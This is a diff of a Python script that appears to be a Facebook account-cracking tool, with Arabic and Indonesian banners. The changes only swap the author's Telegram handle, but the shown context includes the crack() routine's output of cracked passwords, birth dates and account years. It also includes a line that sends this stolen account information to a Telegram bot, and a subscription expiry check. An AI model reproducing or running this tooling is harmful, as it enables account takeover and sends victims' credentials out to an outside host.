@@ -43,7 +43,7 @@ with Progress(console=console, transient=True) as progress:
 
 
 import datetime;now = datetime.date.today();target = datetime.date(2023, 12, 26)
-if now >=target:exit("توقف الاشتراك راسل موسكو @GFT30 وفعل")
+if now >=target:exit("توقف الاشتراك راسل موسكو @GFT28 وفعل")
 
 try:
  import requests
@@ -710,7 +710,7 @@ def login_lagi334():
 		exit()
 	except:pass
 L = '\x1b[1;35m' # بنفسجي
-# @GFT30 -- Moscow
+# @GFT28 -- Moscow
 
 def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
@@ -732,7 +732,7 @@ def menu(my_name,my_id):
 	g67 = '\x1b[38;5;14m'
 	print(g67+'_'*67)
 	print('\n   \033[0m\033[1;93m [\033[1;92m\033[1;44m  𝐓𝐇𝐄 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑     \033[0m\033[1;93m]\n')
-	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}\x1b[38;5;133m 𝑇𝐸l𝐸 \x1b[38;5;230m ⁞ \x1b[38;5;153m@GFT30')
+	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}\x1b[38;5;133m 𝑇𝐸l𝐸 \x1b[38;5;230m ⁞ \x1b[38;5;153m@GFT28')
 	print('\x1b[38;5;230m')
 	print('')
 	print(g67+'━'*67)
@@ -1142,7 +1142,7 @@ def crack(idf,pwv):
 
   ✦ 𝒑𝒂𝒔𝒔𝒘𝒓𝒅  ➛ {pw}\n
 
- • BY : Moscow || @GFT30				
+ • BY : Moscow || @GFT28				
 					'''
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='SESI'))
@@ -1167,7 +1167,7 @@ def crack(idf,pwv):
 
 لا تنسى صور الصيد 
 
- • BY : Moscow || @GFT30				
+ • BY : Moscow || @GFT28				
 					'''
 					statusok1 = nel(statusok, style='Heavenly')
 					cetak(nel(statusok1, title='OK'))
@@ -1213,7 +1213,7 @@ def crack(idf,pwv):
 
 لا تنسى صور الصيد 
 
- • BY : Moscow || @GFT30		
+ • BY : Moscow || @GFT28		
   
 ▱▱▱▱▱▱▱▱▱▱▱▱▱▱
 
@@ -1227,7 +1227,7 @@ def crack(idf,pwv):
 ✦ - Tahun Akun : {tahun}\n
 ✦ - Tanggal Lahir : {ttl}\n
 ▱▱▱▱▱▱▱▱▱▱▱▱▱▱
-@GFT30 || VIP || ڪينزو
+@GFT28 || VIP || ڪينزو
 		  										  								
            '''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
@@ -1268,7 +1268,7 @@ def crack(idf,pwv):
 
 الف عافيه لا تنسى صور الصيد 
 
- • BY : Moscow || @GFT30				
+ • BY : Moscow || @GFT28				
 					'''
 					statusok1 = nel(statusok, style='Heavenly')
 					cetak(nel(statusok1, title='OK'))
